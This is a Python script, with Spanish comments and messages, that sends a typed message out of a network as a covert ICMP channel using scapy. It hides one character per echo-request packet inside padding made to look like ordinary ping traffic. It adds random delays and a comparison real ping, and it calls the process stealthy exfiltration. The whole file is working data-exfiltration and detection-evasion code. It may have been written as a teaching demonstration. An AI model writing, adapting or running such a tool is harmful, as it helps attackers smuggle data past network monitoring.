import os
import sys
import time
import random
import struct # Importado para manejar el timestamp en formato binario

try:
    from scapy.all import IP, ICMP, sr1
except ImportError:
    print("Error: La librería 'scapy' no está instalada.")
    print("Por favor, instálala ejecutando: pip install scapy")
    sys.exit(1)

IP_DESTINO = "8.8.8.8" # Un destino común como el DNS de Google
MENSAJE_SECRETO = input("Ingresa el mensaje a exfiltrar: ")
RETRASO_MIN = 1.0
RETRASO_MAX = 3.0


IP_ID = random.randint(1, 65535)

def verificar_privilegios():
    if os.name == 'posix' and os.geteuid() != 0:
        print("\nError: Este script debe ser ejecutado como root.")
        print("Por favor, inténtalo de nuevo usando 'sudo python3 tu_script.py'.")
        sys.exit(1)
    elif os.name == 'nt':
        print("\nAdvertencia: En Windows, este script necesita privilegios de Administrador para enviar paquetes raw.")
        print("Si encuentras errores, por favor, ejecuta este script desde una terminal de administrador.")

def ping_demostracion(mensaje):
    """Ejecuta un ping real del sistema para mostrar cómo se ve el tráfico normal."""
    print(f"\n--- {mensaje} ---")
    print(f"[*] Ejecutando 'ping -c 3 {IP_DESTINO}' para comparación...")
    if os.name == 'posix':
        os.system(f"ping -c 3 {IP_DESTINO}")
    else: # Windows
        os.system(f"ping -n 3 {IP_DESTINO}")
    print("-------------------------------------------------------------------\n")

def main():
    """Función principal del script."""
    verificar_privilegios()

    print("===================================================================")
    print(f"[*] IP de Destino: {IP_DESTINO}")
    print(f"[*] Mensaje a Exfiltrar: '{MENSAJE_SECRETO}'")
    print(f"[*] ID de IP para esta sesión: {IP_ID}")
    print("-------------------------------------------------------------------")

    # Demostración del tráfico normal ANTES de nuestra operación
    ping_demostracion("PING REAL (ANTES)")

    input("Presiona Enter cuando estés listo para comenzar la exfiltración sigilosa...")

    for i, caracter in enumerate(MENSAJE_SECRETO):
        try:
         
            timestamp = struct.pack('d', time.time())

            padding = (caracter + "abcdefghijklmnopqrstuvwxy" * 2).encode('utf-8')[:48]
            
            payload_sigiloso = timestamp + padding

            paquete = IP(dst=IP_DESTINO, id=IP_ID) / ICMP(type="echo-request", seq=i) / payload_sigiloso
          
            respuesta = sr1(paquete, timeout=2, verbose=0)

            if respuesta:
                print(f"[{i+1}/{len(MENSAJE_SECRETO)}] Caracter '{caracter}' enviado -> Respuesta de {respuesta.src} | Seq={i} | ID={paquete[IP].id}")
            else:
                print(f"[{i+1}/{len(MENSAJE_SECRETO)}] Caracter '{caracter}' enviado -> No se recibió respuesta (timeout) | Seq={i} | ID={paquete[IP].id}")

            retraso = random.uniform(RETRASO_MIN, RETRASO_MAX)
            time.sleep(retraso)

        except Exception as e:
            print(f"\nError al enviar el paquete: {e}")
            break

    print("\n--- EXFILTRACIÓN COMPLETADA ---")


if __name__ == "__main__":
    main()